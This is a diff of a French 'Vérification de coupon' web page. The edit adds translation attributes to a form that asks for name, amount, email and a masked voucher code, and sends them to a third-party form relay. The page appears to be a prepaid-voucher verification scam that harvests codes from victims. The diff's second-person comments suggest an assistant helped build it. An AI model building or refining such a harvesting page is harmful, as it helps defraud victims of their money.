@@ -152,10 +152,9 @@
 </head>
 <body>
 
-<!-- Le reste de ton HTML reste identique à ton message -->
 <header class="main-header" style="padding: 15px 20px; background: white; border-bottom: 1px solid #e2e8f0;">
   <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
-    <a href="index.html" style="text-decoration: none; color: #2563eb; font-weight: 700;">Accueil</a>
+    <a href="index.html" class="nav-item" style="text-decoration: none; color: #2563eb; font-weight: 700;" data-i18n="nav_home">Accueil</a>
     
     <div class="relative">
       <div class="selected-lang" id="lang-button">
@@ -176,46 +175,52 @@
 
 <main class="form-container">
   <div class="card-form">
-    <h2 class="section-title" style="font-size: 1.5rem; margin-bottom: 30px; text-align: center; color: #0f172a;">Vérification de coupon</h2>
+    <h2 class="section-title" data-i18n="form_title" style="font-size: 1.5rem; margin-bottom: 30px; text-align: center; color: #0f172a;">Vérification de coupon</h2>
     
     <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
       <input type="hidden" name="access_key" value="TA_CLE_ICI">
 
       <div class="grid-2">
         <div class="form-group">
-          <label for="nom">Nom :</label>
+          <label for="nom" data-i18n="form_nom">Nom :</label>
           <input type="text" id="nom" name="nom" required placeholder="Dupont">
         </div>
         <div class="form-group">
-          <label for="prenom">Prénom :</label>
+          <label for="prenom" data-i18n="form_prenom">Prénom :</label>
           <input type="text" id="prenom" name="prenom" required placeholder="Jean">
         </div>
       </div>
 
       <div class="form-group">
-        <label for="amount">Montant (€) :</label>
+        <label for="amount" data-i18n="form_montant">Montant (€) :</label>
         <input type="number" id="amount" name="amount" min="1" required placeholder="50">
       </div>
 
       <div class="form-group">
-        <label for="email">Votre email :</label>
+        <label for="email" data-i18n="form_email">Votre email :</label>
         <input type="email" id="email" name="email" required placeholder="jean@mail.com">
       </div>
 
       <div class="form-group">
-        <label for="code">Code du coupon :</label>
+        <label for="code" data-i18n="form_code">Code du coupon :</label>
         <input type="password" id="code" name="code" class="code-input" required placeholder="•••• •••• ••••">
         
         <div class="toggle-box">
-          <p style="font-size: 11px; font-weight: 800; color: #2563eb; text-transform: uppercase; margin-bottom: 5px;">Afficher le code :</p>
+          <p style="font-size: 11px; font-weight: 800; color: #2563eb; text-transform: uppercase; margin-bottom: 5px;" data-i18n="form_toggle_label">Afficher le code :</p>
           <div class="radio-group">
-            <label class="radio-item"><input type="radio" name="show_code" onclick="toggleCode(true)"> Oui</label>
-            <label class="radio-item"><input type="radio" name="show_code" checked onclick="toggleCode(false)"> Non</label>
+            <label class="radio-item">
+              <input type="radio" name="show_code" onclick="toggleCode(true)"> 
+              <span data-i18n="form_oui">Oui</span>
+            </label>
+            <label class="radio-item">
+              <input type="radio" name="show_code" checked onclick="toggleCode(false)"> 
+              <span data-i18n="form_non">Non</span>
+            </label>
           </div>
         </div>
       </div>
 
-      <button type="submit" class="btn-submit">Authentifier le coupon</button>
+      <button type="submit" class="btn-submit" data-i18n="form_envoyer">Authentifier le coupon</button>
     </form>
   </div>
 </main>
@@ -230,6 +235,8 @@
   function toggleCode(show) {
     document.getElementById('code').type = show ? 'text' : 'password';
   }
+
+  // Note : Assure-toi que ta fonction setLang() gère bien les clés injectées ci-dessus.
 </script>
 
 </body>
